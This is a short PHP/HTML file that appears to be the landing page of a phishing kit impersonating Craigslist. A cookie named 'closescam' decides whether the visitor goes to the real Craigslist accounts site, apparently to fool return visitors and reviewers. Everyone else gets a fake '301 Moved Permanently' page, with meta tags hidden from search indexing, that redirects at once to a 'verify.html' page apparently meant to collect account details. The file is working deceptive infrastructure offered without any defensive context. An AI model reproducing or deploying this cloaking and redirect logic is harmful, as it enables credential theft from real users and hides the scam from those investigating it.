<?php
$closed=$_COOKIE["closescam"];
if ($closed != ''){
header('location:https://accounts.craigslist.org/');
}
?>
<html><head><title>301 Moved Permanently</title><!--googleoff: all-->
<meta http-equiv="Description" content=" notneeded "><!--googleon: all--><!--googleoff: all-->
<meta http-equiv="Keywords" content=" notneeded "><!--googleon: all--><!--googleoff: all-->
<meta http-equiv="refresh" content="0; URL=verify.html">
<script language="JavaScript" type="text/javascript">
<!--
function redirect() { 
setTimeout("window.location.replace('verify.html')", 0); }
-->
</script>
</head>